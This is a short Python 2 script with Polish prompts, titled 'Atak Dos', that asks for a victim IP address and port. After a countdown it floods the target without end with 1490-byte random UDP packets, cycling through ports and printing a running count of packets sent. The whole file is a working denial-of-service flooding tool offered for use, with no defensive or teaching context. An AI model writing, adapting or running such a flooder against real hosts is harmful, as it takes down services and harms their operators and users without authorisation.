import sys
import os
import time
import socket
import random
#Kolor
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
#Czas
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
cprint(figlet_format('Atak Dos'), 'red')
print
ip = raw_input("IP Ofiary: ")
port = input("Port: ")

os.system("clear")
cprint(figlet_format('Uruchamianie'), 'red')
time.sleep(3)
print "Atak DoS rozpocznie sie za:"
time.sleep(1)
print "- 3"
time.sleep(1)
print "- 2"
time.sleep(1)
print "- 1"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Wyslano %s pakietow do %s przez port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

